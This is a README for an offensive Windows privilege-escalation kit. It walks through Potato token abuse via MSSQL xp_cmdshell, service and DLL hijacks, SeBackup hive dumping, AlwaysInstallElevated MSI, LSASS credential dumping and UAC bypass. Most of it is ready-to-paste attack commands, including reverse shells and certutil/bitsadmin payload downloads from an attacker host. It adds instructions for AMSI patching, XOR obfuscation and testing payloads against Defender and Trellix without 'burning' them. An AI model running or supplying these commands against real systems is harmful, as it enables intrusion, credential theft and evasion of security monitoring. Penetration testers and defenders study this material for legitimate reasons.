# Windows privesc toolkit — Potato · service · DLL · SeBackup

**Foothold on a Windows target · attacker 10.0.0.10 · goal: SYSTEM (or a local/domain admin).**
Which route fits is decided by `whoami /priv`, `whoami /groups`, and a service/DLL enum — see STEP 0.

## How these scripts work (read this first)
- **The `gen_*.py` scripts run on YOUR attacker box and only PRINT text.** They execute nothing on the target.
- **The output is commands you COPY and PASTE** — into an MSSQL `xp_cmdshell` query (Route 1 as written) or a normal cmd/PowerShell foothold shell (Routes 2–4).
- Flow every time: *run generator on attacker → read the printed block → paste it into the target.*
- **One-time config:** edit `LHOST` / `LPORT` / `TOOL` / `STAGE` / `REVTYPE` at the top of **`_winpriv_common.py`** — every script reads it. Never hand-edit the emitted base64 blobs.
- **Hardened-target knobs** (per-invocation overrides): `--stagedir "D:\path"` when `C:\Windows\Temp` is write-restricted/monitored; `--revtype powershell|nc` — default PowerShell, or `nc` (needs `nc.exe` staged) to survive **Constrained Language Mode / no-PowerShell**. `REVTYPE=nc` flips the whole kit incl. the Potato callback.
- **You supply the Potato exe** (air-gapped, like the Linux PoCs) — grab `GodPotato-NET*.exe` / `EfsPotato.exe` / `PrintSpoofer64.exe` from its GitHub release and drop it in the dir you serve. The compiled service/DLL/preload payloads are built here with mingw (no target toolchain needed).
- **Every revshell calls back to `nc -lvnp 443`** on the attacker — **start the listener first, always.**

## STEP 0 — enumerate first (from your foothold)
**One-shot:** paste **`enum.bat`** — it checks every route's precondition and prints `==> run <generator>` next to each hit (the self-recommending front door; read-only). It also prints a **NETWORK/ROUTING** section (interfaces, routing table, default gateway, ARP) and a machine `NET-IFACE/NET-ROUTE/NET-NEIGH/NET-PEER` block — feed the output to `recce ingest` to map host-to-host reachability and dual-homed pivots. Or run the checks by hand:
```
whoami /priv     → SeImpersonate/SeAssignPrimaryToken = ROUTE 1 · SeBackup/SeRestore = ROUTE 4
whoami /groups   → "Backup Operators" = ROUTE 4 · "Administrators" but not elevated = fodhelper UAC (below)
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\\"   → unquoted path = ROUTE 2a
accesschk.exe -uwcqv <youruser> * 2>nul   (or PowerUp Get-ModifiableService)           → weak service perms = ROUTE 2b
reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated  → 0x1 in BOTH HKLM+HKCU = ROUTE 5
```
Or run **winPEAS** for the exhaustive sweep. **Prefer a privilege/misconfig win (Routes 1/2/4) — they're deterministic; a DLL hijack (Route 3) depends on a specific load you must observe with procmon.**

## Which routes APPLY (check ALL — don't stop at the first)
These map a *condition* to a route. A target usually satisfies **several** — enumerate every one, **exploit the safest first** (a token/misconfig win can't crash the box; a kernel/CVE can), and for an assessment **document them all** (each is a separate finding, whether or not you needed it). `enum.bat` tallies them for you.
```
Hold SeImpersonate / SeAssignPrimaryToken?              ─► ROUTE 1  Potato → SYSTEM        (gen_full/nonet/forma)
Unquoted service path, OR modifiable binPath?           ─► ROUTE 2  Service misconfig       (gen_service)
A service/app loads a DLL from a dir you can write?      ─► ROUTE 3  DLL hijack              (gen_dll)
A SYSTEM svc/task runs a RELATIVE binary, or writable task?─► ROUTE 3b PATH intercept / schtask (gen_winmisc)
Hold SeBackup/SeRestore, or in "Backup Operators"?      ─► ROUTE 4  Hive dump → PtH/crack    (gen_hashdump)
BOTH AlwaysInstallElevated keys = 0x1?                   ─► ROUTE 5  MSI → SYSTEM            (gen_msi)
SeDebug/admin, or want stored creds?                     ─► ROUTE 6  Cred harvest + LSASS    (gen_creds)
Any OTHER dangerous SeXxx priv, or a local CVE?          ─► gen_winexploit map | list       (privilege→route + CVE bucket)
Already a local admin but medium-integrity (UAC)?       ─► UAC bypass family              (gen_uac · 7 methods)
```
**First move on any foothold:** `python3 gen_winexploit.py map` prints the `whoami /priv` → route table for **every** dangerous token (SeImpersonate/SeBackup/SeDebug/SeLoadDriver/SeTakeOwnership/…), so you never wonder which tool handles a privilege.

---
# ROUTE 1 — SeImpersonate → Potato (SYSTEM), via MSSQL `xp_cmdshell`

## Establishing the MSSQL channel (do this FIRST — the generators assume it)
Route 1 as written runs its commands through **MSSQL `xp_cmdshell`** (the original foothold: a SQL service
account that holds SeImpersonate). The kit does **not** open the connection — you do, on the attacker box, then
paste the generators' `EXEC …` lines into it:
```bash
# connect (impacket) — SQL login or Windows auth:
mssqlclient.py 'sa:Password1@10.0.0.5'                 # or:  DOMAIN/user:pass@host -windows-auth
# enable xp_cmdshell (once):
enable_xp_cmdshell        # mssqlclient built-in;  or run the T-SQL:
#   EXEC sp_configure 'show advanced options',1; RECONFIGURE;
#   EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;
# verify you're the SQL service account (should hold SeImpersonate):
EXEC master..xp_cmdshell 'whoami /priv'
```
You now have command execution **as the SQL service account**. Run Route 1 below to Potato → SYSTEM.
**Other channels:** if your foothold is instead a normal cmd/PowerShell shell (RDP/WinRM/web/rev-shell), skip
this and paste the commands directly — no `xp_cmdshell` wrapper. **Routes 2–6 emit plain shell commands;** if
your channel is *still* MSSQL at that point, wrap each in `EXEC master..xp_cmdshell '<command>'` yourself — but
normally Route 1's Potato pops a SYSTEM reverse shell first, after which everything pastes directly.

## Pick the variant (30-second decision)
```
Can the target reach YOU over HTTP (egress open)?
├─ YES ────────────────────────────────────► gen_full.py      (HTTP cradle, 1 line)
└─ NO ─ egress blocked, carry bytes over SQL:
        Old / finicky .NET, or want "just works"?
        ├─ YES (robust, disk ok) ───────────► gen_forma.py     (certutil→disk, no AMSI)
        └─ NO  (want fileless, quieter) ────► gen_nonet.py     (b64→memory + AMSI patch)
```

## Tool choice is ONE line — delivery is identical for all Potatoes
Set `TOOL` in **`_winpriv_common.py`** (one place, all three scripts read it); delivery (HTTP/base64/certutil) never changes — only the invoke flag does, and the generator emits it for you:

| TOOL value | invoke syntax emitted | when |
|---|---|---|
| `GodPotato-NET4/-NET35/-NET2.exe` | `-cmd "<CMD>"` | **default; RPCSS = 1058-immune.** Match `-NET*` to target .NET |
| `EfsPotato.exe` | `"<CMD>"` *(bare)* | LSASS/EFSRPC fallback; append pipe int `1-5` if a pipe is filtered |
| `SharpEfsPotato.exe` | `-p C:\Windows\System32\cmd.exe -a "/c <CMD>"` | EfsRpc fork |
| `PrintSpoofer64.exe` | `-c "<CMD>"` | **needs Spooler → most 1058-prone; last resort** |
| `JuicyPotatoNG.exe` | `-t * -p "cmd.exe" -a "/c <CMD>"` | old; needs a COM CLSID |
| `SweetPotato.exe` | `-a "<CMD>"` | **auto-picks the best technique** — the "family in one"; try when unsure |
| `RoguePotato.exe` | `-r <LHOST> -e "<CMD>" -l 9999` | needs an attacker OXID redirector: `socat tcp-listen:135,reuseaddr,fork tcp:<target>:9999` |
| `GenericPotato.exe` | `-e cmd.exe -a "/c <CMD>" -m namedpipe` | named-pipe / HTTP coercion variant |

(`DCOMPotato` and `LocalPotato` also exist — situational; supply the exe, see their repos. `SweetPotato` covers most cases.)

`<CMD>` = `powershell -e <REV_B64>` (the SYSTEM revshell) for every tool. **Swap `TOOL`, re-run the same generator — no per-tool setup.**

## Always-first setup
```bash
cd <this dir>
# edit LHOST / LPORT / TOOL in _winpriv_common.py (one place)
nc -lvnp 443                     # attacker: catch the SYSTEM shell
```

## Variant A — HTTP cradle (egress open, ONE line)
```bash
cp /path/GodPotato-NET4.exe .        # match the URL / .NET build
sudo python3 -m http.server 80       # serve it
python3 gen_full.py                  # copy Section C
```
Order: **stager file → http.server → listener → then the SQL line.**
```
EXEC master..xp_cmdshell 'powershell -ep bypass -e <BIG_B64>';   -- AMSI patch+load+revshell
```

## Variant B — no-net FILELESS (egress blocked, quiet)
```bash
python3 gen_nonet.py /path/GodPotato-NET4.exe
```
```
STEP 1: paste N echo-chunk lines IN ORDER   (first '>', rest '>>')  -> g.b64
STEP 2: EXEC master..xp_cmdshell 'powershell -ep bypass -e <INVOKE_B64>';
        (AMSI byte-patch + FromBase64String + Assembly::Load + revshell; deletes g.b64)
```

## Variant C — no-net ON-DISK / Form A (most robust, no AMSI)
```bash
python3 gen_forma.py /path/GodPotato-NET4.exe
```
```
STEP 1: paste N echo-chunk lines IN ORDER   -> g.b64
STEP 2: EXEC master..xp_cmdshell 'certutil -decode C:\Windows\Temp\g.b64 C:\Windows\Temp\g.exe';
        EXEC master..xp_cmdshell 'del C:\Windows\Temp\g.b64';
STEP 3: EXEC master..xp_cmdshell 'C:\Windows\Temp\g.exe -cmd "powershell -e <REV_B64>"';
STEP 4: EXEC master..xp_cmdshell 'del C:\Windows\Temp\g.exe';   -- after you have the shell
```

## Tradeoffs at a glance
| Variant | AMSI | certutil | Disk | Lines |
|---|---|---|---|---|
| A · HTTP cradle | reflection must work | — | none | **1** |
| B · no-net fileless | reflection must work | — | transient `.b64` | N+1 |
| C · no-net on-disk | **none** | **yes** (signatured) | `.b64`+`.exe` | N+2 |

## Troubleshooting — error codes decide the tool
| Code | Meaning | Fix |
|---|---|---|
| **1058** | service disabled | *tool problem, not dead* — PrintSpoofer needs Spooler (often off); **GodPotato uses RPCSS = unaffected**. Fall back GodPotato→EfsPotato. |
| — | EFSRPC pipe filtered | `EfsPotato.exe "cmd" N` — N=1 lsarpc·2 efsrpc·3 samr·4 lsass·5 netlogon |
| **1722** | RPC server unavailable | endpoint blocked — switching tools won't help |
| **5** | access denied | recheck `SeImpersonatePrivilege`/`SeAssignPrimaryToken` are **Enabled**, not just Present (`whoami /priv`) |
| — | wrong .NET | swap `GodPotato-NET4` → `-NET35` / `-NET2` to match target |

---
# ROUTE 2 — Service misconfiguration → SYSTEM

Both flavors get the SCM to run YOUR binary as the service account (usually SYSTEM). **Build the payload first:**
```bash
python3 gen_payload.py exe --action revshell     # or --action revshell_amsi | add_admin | add_admin_domain
x86_64-w64-mingw32-gcc -o payload.exe payload.c  # (the printed line; --arch x86 for a 32-bit service)
```
`--action` menu (all four also apply to Route 3): `revshell` (SYSTEM shell) · `revshell_amsi` (same, but the spawned PowerShell self-patches AMSI first) · `add_admin` (local admin `svcadm`) · `add_admin_domain` (only if the service runs as a DC/privileged domain acct). The embedded command is XOR-obfuscated in the PE (static-signature hygiene; **not** EDR-proof).

**2a · Unquoted service path** — the ImagePath has spaces and no quotes, so Windows tries `C:\Program.exe`, `C:\Program Files\My.exe`, … before the real exe. Plant `payload.exe` at the first candidate whose parent dir you can write:
```bash
python3 gen_service.py --binpath "C:\Program Files\My App\svc.exe" --service MyApp
# prints: the candidate list + icacls write-check + certutil drop + `sc stop/start`
```

**2b · Weak service perms** — you hold `SERVICE_CHANGE_CONFIG`, so just repoint the binary:
```bash
python3 gen_service.py --mode binpath --service MyApp          # sc config binPath= (SERVICE_CHANGE_CONFIG)
python3 gen_service.py --mode writable_binary --service MyApp  # the service EXE file is writable -> overwrite it (no SC perms)
python3 gen_service.py --mode reg_imagepath --service MyApp    # the service REGISTRY key is writable -> repoint ImagePath
```
`accesschk` tells you which: `-quvw` (service perms) · `-quvw <exe>` (file ACL) · `-kvuqsw …\Services` (registry ACL). Needs restart rights or it fires on reboot. Restore the original after.

**2c · Writable scheduled task / autorun** (same payload, different trigger) — if you can write a task's program or an autorun entry:
```
schtasks /query /fo LIST /v | findstr /i "Task To Run"        REM find a task whose exe you can overwrite
REM overwrite that exe with your payload.exe (certutil drop, below), or create your own task if you may:
schtasks /create /tn Updater /tr C:\Windows\Temp\payload.exe /sc minute /mo 1 /ru SYSTEM /f
REM autorun alt: reg add HKLM\...\Run  (fires as the next user to log on)
```

---
# ROUTE 3 — DLL hijacking → SYSTEM

A service/app loads a DLL by name from a directory you can write (missing DLL, or a writable dir earlier in its search order). Drop a malicious DLL of that exact name; `DllMain` spawns a thread running your action in the loader's context.
```bash
python3 gen_dll.py --dll HijackedName.dll --dir "C:\Apps\Vuln" --action revshell   # or revshell_amsi | add_admin
# prints: mingw -shared compile + certutil drop at the exact path + `sc stop/start` trigger
```
**Find candidates** (from the foothold): PowerUp `Find-PathDLLHijack` (writable %PATH% dirs) · procmon filter `Result=NAME NOT FOUND` + `.dll` while restarting the service · a writable app dir holding a DLL it loads by relative name.
Notes: dropped name must match the loaded name **exactly**; DLL **arch must match the loader** (32-bit service → `--arch x86`); `DllMain` uses a thread so it's loader-lock-safe.

---
# ROUTE 3b — PATH interception + scheduled-task abuse (`gen_winmisc.py`)

The parity partner to Linux `gen_misc.py`. Build `payload.exe` first (`gen_payload.py exe`), then:
```bash
python3 gen_winmisc.py pathhijack --name svc --dir "C:\Writable\OnPath"   # SYSTEM svc/task calls a RELATIVE binary + a writable dir sits earlier in %PATH%
python3 gen_winmisc.py schtask --mode binary --task "\Microsoft\...\T"     # writable EXE a SYSTEM task runs -> overwrite it
python3 gen_winmisc.py schtask --mode xml    --task "\...\T"               # writable task XML in System32\Tasks -> repoint <Command>
```
Find them: writable `%PATH%` dirs (`icacls` each) + a service with a bare `ImagePath`; `schtasks /query /fo LIST /v` for a SYSTEM task whose "Task To Run" exe you can write. Both run your exe as SYSTEM (or the task's account).

---
# ROUTE 4 — SeBackup / SeRestore / "Backup Operators" → hive dump → admin

These privileges READ any file bypassing the DACL — including the locked `SAM`+`SYSTEM` hives (local hashes) and `SECURITY` (LSA/cached domain secrets). You don't get a shell directly; you copy the hives out, dump hashes **offline on the attacker**, then Pass-the-Hash / crack to Administrator. On a DC, dump `NTDS.dit` for the whole domain.
```bash
python3 gen_hashdump.py --mode local     # member server / workstation: SAM+SYSTEM+SECURITY -> secretsdump LOCAL
python3 gen_hashdump.py --mode dc        # domain controller: NTDS.dit + SYSTEM -> every domain hash (incl. krbtgt)
```
It prints: the target-side `reg save` (or `robocopy /b` fallback) → exfil options (SMB/HTTP/base64) → the attacker-side `secretsdump.py` line → PtH/crack. **SeRestore** additionally *writes* any file (overwrite a service binary / drop a System32 DLL → SYSTEM); Backup Operators holds both.

---
# ROUTE 5 — AlwaysInstallElevated → SYSTEM (malicious MSI)

If BOTH policy keys are `0x1`, **any** user's MSI install runs as SYSTEM. Build an MSI whose install-sequence CustomAction fires your action in that SYSTEM context, ship it, `msiexec` it.
```bash
python3 gen_msi.py --action revshell                     # default backend=wixl (self-built, NO AV signature)
python3 gen_msi.py --action add_admin --backend msfvenom # alt: HEAVILY signatured — lab/known-clean only
```
It prints: the build line (`wixl -o …` or `msfvenom … -f msi`) → delivery → the trigger:
```
reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated   REM BOTH must be 0x1
reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
msiexec /quiet /qn /i C:\Windows\Temp\evil.msi                                          REM runs AS SYSTEM
```
`--backend msfvenom` (default) also offers a direct MSI revshell (`windows/x64/shell_reverse_tcp`); `--backend wixl` emits a `.wxs` + build line with zero external framework. **Both keys must read `0x1` — one alone does nothing.**

---
# ROUTE 6 — Credential harvesting + LSASS (the other half of the funnel)

Popping SYSTEM is one path; **finding a credential that IS admin** is the other — and it's often the real one (and it pairs with the impacket + hashcat you already have). Target side is all built-in LOLBins:
```bash
python3 gen_creds.py --mode hunt     # sweep unattend.xml / cmdkey+runas / AutoLogon reg / PS history / web.config / WiFi / RDP / DPAPI
python3 gen_creds.py --mode lsass    # comsvcs.dll MiniDump (needs SeDebug/admin) -> offline pypykatz
python3 gen_creds.py --mode gpp      # domain GPP cpassword in SYSVOL (public AES key; any domain user reads it)
```
Offline/actioning (attacker box): `pypykatz lsa minidump ls.dmp` · `nxc smb <t> -u U -H <hash>` · `evil-winrm -i <t> -u U -p P` · `psexec.py -hashes :<hash> U@<t>`. **`pypykatz` is pip-only — pre-stage it on the air-gapped operator box** (`pipx install pypykatz`); or parse the dump with mimikatz on any Windows box.

# Windows CVE / privilege bucket (the Linux-Bucket-2 analog)
For dangerous privileges the routes above don't cover, and drop-and-run local CVEs:
```bash
python3 gen_winexploit.py map              # whoami /priv -> route/tool for EVERY dangerous token
python3 gen_winexploit.py list             # the technique/CVE table
python3 gen_winexploit.py printnightmare   # Spooler DLL-load -> SYSTEM (reuses gen_payload dll)
python3 gen_winexploit.py seriussam        # HiveNightmare: user-readable SAM via VSS shadow -> offline dump
python3 gen_winexploit.py seloaddriver     # SeLoadDriver -> BYOVD (you supply the vulnerable signed driver)
python3 gen_winexploit.py localkernel      # systeminfo -> wesng -> supply the exact-build PoC.exe
```
Same honesty as the Linux bucket: **version-MATCH first**, several need a PoC/driver **you supply** (air-gapped), and a wrong-build kernel PoC can BSOD the box.

---
# UAC bypass family — medium-integrity admin → HIGH integrity (`gen_uac.py`)

Not a privesc to SYSTEM — it elevates an **already-admin** token past UAC (e.g. after `add_admin`, or an admin RDP/WinRM session that's medium-integrity). Per-user HKCU registry hijacks of an auto-elevating trusted binary; all fileless (except cmstp). Build `payload.exe` (`gen_payload.py exe`) first, then:
```bash
python3 gen_uac.py list                    # 7 methods + when to use each
python3 gen_uac.py --method fodhelper       # ms-settings hijack (classic)
python3 gen_uac.py --method silentcleanup   # %windir% in an auto-elevated task (fires at low UAC levels)
python3 gen_uac.py --method wsreset         # Store-reset handler (when ms-settings is signatured)
#   also: computerdefaults · eventvwr · sdclt · cmstp(INF)
```
Each prints the HKCU hijack + trigger + cleanup. **Precondition: you're already in Administrators** (medium integrity) — this crosses UAC, it doesn't create privilege. From high integrity → go SYSTEM (`psexec -s`, a service, or `gen_creds --mode lsass`).

---
# Payload delivery (Routes 2, 3, 4, 5, fodhelper)
Get the compiled `payload.exe`/`.dll` across — **ordered quietest → loudest** (the generators emit `certutil` by default; swap in a quieter line on a monitored host):
```
REM quietest — SMB (no LOLBin download alert):
copy \\10.0.0.10\share\payload.exe C:\plant\path       REM attacker: impacket-smbserver share . -smb2support
REM no-egress — base64 through your exec channel (no network at all):
certutil -decode staged.b64 C:\plant\path\payload.exe  REM or PowerShell [IO.File]::WriteAllBytes(...FromBase64String('<b64>'))
REM HTTP via certutil — WORKS but certutil download is a common EDR/LOLBin alert:
certutil -urlcache -f http://10.0.0.10/payload.exe "C:\plant\path"   REM serve: python3 -m http.server 80
REM alt HTTP (also watched):  bitsadmin /transfer j http://10.0.0.10/p.exe C:\plant\p.exe
```
`certutil` and `bitsadmin` downloads are classic LOLBin alerts — prefer **SMB** or the **no-net base64** path on a monitored host.

# Verify success
```
whoami                          -> nt authority\system            (Routes 1/2/3 revshell)
net localgroup administrators   -> lists svcadm                   (add_admin)
secretsdump ... LOCAL           -> Administrator:500:...:<nthash>  (Route 4) -> psexec.py -hashes :<nthash>
```

## FULL WORKED EXAMPLE (Route 2b, weak service perms, egress open)
```bash
# --- on the ATTACKER (10.0.0.10) ---
python3 gen_payload.py exe --action revshell           # writes payload.c + prints the compile line
x86_64-w64-mingw32-gcc -o payload.exe payload.c        # compile the SYSTEM revshell exe
python3 -m http.server 80                              # terminal 1 — serve payload.exe
nc -lvnp 443                                           # terminal 2 — catch the SYSTEM shell
python3 gen_service.py --mode binpath --service MyApp  # terminal 3 — PRINTS the target commands

# --- paste the printed block into your TARGET foothold shell ---
certutil -urlcache -f http://10.0.0.10/payload.exe C:\Windows\Temp\payload.exe   REM deliver
sc config MyApp binPath= "C:\Windows\Temp\payload.exe"                           REM repoint (space after binPath= !)
sc stop MyApp & sc start MyApp                                                   REM trigger -> SYSTEM revshell
# terminal 2 pops:  whoami -> nt authority\system
sc config MyApp binPath= "<original path>"                                       REM restore
```

## AV / EDR reality (avoiding quarantine + alerts)
**Ceiling, honestly:** the kit beats **AMSI + static AV signatures** (native XOR'd payloads with a *random per-build key*, self-built wixl MSI, fresh-compiled artifacts) — it does **NOT** reliably beat **behavioral EDR** (CrowdStrike/SentinelOne/Defender-for-Endpoint). Reduce quarantine and obvious alerts; don't assume invisibility.

**Choose the quiet path** (measured with `report/avcheck.sh` — ClamAV floor):
- **Prefer the NATIVE-exe routes** (service / DLL / Potato-payload) — the XOR'd PE/DLL come back **clean** at the static floor. The XOR key is now random per build, so every payload is byte-unique.
- **The MSI (AlwaysInstallElevated) route is AV-flagged either way** — ClamAV flags the wixl MSI (Emotet heuristic) *and* msfvenom (MSShellcode). Use it only when AlwaysInstallElevated is your only path; `--backend wixl` is the lesser of the two but still seen.
- **`--revtype nc`** not the PowerShell revshell where AMSI/AV is aggressive — `nc.exe` isn't AMSI-scanned and the PS `iex` pattern is signatured.
- **SMB or no-net base64 delivery** not `certutil`/`bitsadmin` (LOLBin download = classic alert).
- **Recompile the ⚠ supplied binaries** (Potato exes, mimikatz, PEAS) — they're **hash-flagged**; see `SUPPLIED-BINARIES.md`.

**Detection profile — pick by noise (ClamAV floor measured):**
| Technique | Detection risk | Quieter alternative |
|---|---|---|
| GPP cpassword / unattend / registry read | **quiet** (read-only) | — |
| native XOR'd exe/dll payload (service/DLL) | **clean at static floor** | (the preferred payload) |
| unquoted-path / weak-service plant | low static · service restart is logged | prove writability (icacls) without restarting |
| Potato (token abuse) | med — known exe hash + RPC/EFSRPC pattern | recompile the Potato exe; SweetPotato |
| LSASS dump via `comsvcs` | **HIGH — EDR-flagged** | nanodump / procdump `-ma`; or PtH instead of dumping |
| **MSI route (wixl OR msfvenom)** | **FLAGGED — both** (Emotet / MSShellcode) | use a native-exe route instead where possible |
| BYOVD driver load | **HIGH — logged, blocklisted** | avoid unless required |

**Test before you burn:** verify your delivery channel with a benign file first — don't fire the real payload into an unknown AV posture and eat both the payload *and* the alert.

### Validate your payloads against YOUR target AV (Defender / Trellix)
ClamAV (`report/avcheck.sh`) is only a **static-signature floor** — a clean result there says little about Defender or Trellix (both add ML + behavioral). Test against the real engines **in a lab VM**, and do it **offline so you don't submit (burn) your payload**:
- **Windows Defender** (free, built into any Win10/11 VM — the accessible real test):
  1. **Disable sample submission first** (or your payload uploads to Microsoft = burned, same as VirusTotal): `Set-MpPreference -SubmitSamplesConsent 2 -MAPSReporting 0` (and disconnect the VM's network).
  2. Static/ML file scan without executing: `"%ProgramFiles%\Windows Defender\MpCmdRun.exe" -Scan -ScanType 3 -File C:\path\payload.exe`
  3. Then **detonate** with real-time protection ON — a clean *file* scan doesn't test the AMSI patch or the spawn behavior, which only trip at runtime.
- **Trellix ENS** (needs a Trellix-equipped lab VM — from the client's build or a lab license): on-demand scan via the ENS console / CLI; disable GTI/cloud telemetry submission the same way. Trellix ENS is aggressive on unsigned mingw PEs calling `WinExec`/`system()` — expect the native payloads to need extra work (recompile, sign, or a different loader) more than Defender does.
- **Never use VirusTotal** for real payloads — it shares samples with every vendor (incl. Trellix + MS) and signatures them within hours.

## Interactive shell note
`xp_cmdshell` and a raw exec channel are **blind/non-interactive** — a command runs and returns output, but you can't respond to prompts or run `runas`/interactive tools. Route 1's Potato revshell gives you a semi-interactive PowerShell `iex` loop; for a fuller session use `--revtype nc` (`nc.exe … -e cmd.exe`) or PtH into WinRM (`evil-winrm`) once you have creds/hash. Confirm SYSTEM either way with `whoami`.

## Honesty notes
- **This defeats AMSI, not EDR.** A native planted PE/DLL is not AMSI-scanned at all; `revshell_amsi` additionally patches the spawned PowerShell's `iex` loop; XOR-obfuscation hides the command string from a *static* signature. But the token-magic, the service reconfig, the DLL load, and the child-process spawn are all **behaviorally logged** — fine for HTB/lab, loud against a real EDR.
- **You supply the Potato exe** (Route 1) — match `-NET*` to the target's .NET; the service/DLL/preload payloads are compiled here with mingw.
- **Route 4 gives hashes, not a shell** — you still need PtH (`psexec.py -hashes`) or an offline crack (`hashcat -m 1000`).
- **Route 5 needs BOTH AlwaysInstallElevated keys = 0x1** (HKLM *and* HKCU) — one alone does nothing. The wixl MSI uses a deferred, no-impersonate CustomAction (runs as SYSTEM); the msfvenom MSI embeds a payload — both loud to EDR.
- **fodhelper needs you to already be admin** (medium integrity) — it crosses UAC, it doesn't create privilege.
- **Chunk limit (Route 1):** cmd line caps at 8191; if the SQL side truncates, lower `CHUNK` (top of script) 6000→4000.
- **base64 has no quotes** → no T-SQL escaping needed anywhere. That's the whole reason we encode.

Files: `_winpriv_common.py` (config + Potato templates + actions + payload C + AMSI) · **Route 1:** `gen_full.py` `gen_nonet.py` `gen_forma.py` `stage_b64.py` · **Route 2/3:** `gen_payload.py` (exe/dll factory) `gen_service.py` (unquoted/weak svc) `gen_dll.py` (search-order) `gen_winmisc.py` (PATH intercept/schtask) · **Route 4:** `gen_hashdump.py` (SeBackup hive dump) · **Route 5:** `gen_msi.py` (AlwaysInstallElevated, wixl/msfvenom) · **Route 6:** `gen_creds.py` (hunt/lsass/gpp) · **CVE bucket:** `gen_winexploit.py` (priv→route map + PrintNightmare/SeriousSAM/BYOVD/localkernel) · **UAC:** `gen_uac.py` (7 methods).

---
Revshell in every route = PowerShell TCP `iex` loop to LHOST:LPORT, run in the loader's SYSTEM context.
Edit **LHOST / LPORT / TOOL in `_winpriv_common.py`** (one place), then re-run any generator. Never edit emitted base64 by hand.
Platform analog: this mirrors LlamaExpress `ad/winprivesc` (the POTATOES run-through) — a new vector = a fingerprint/marker + a playbook + (maybe) a `_tools/` binary in the substrate, never a killchain edit.
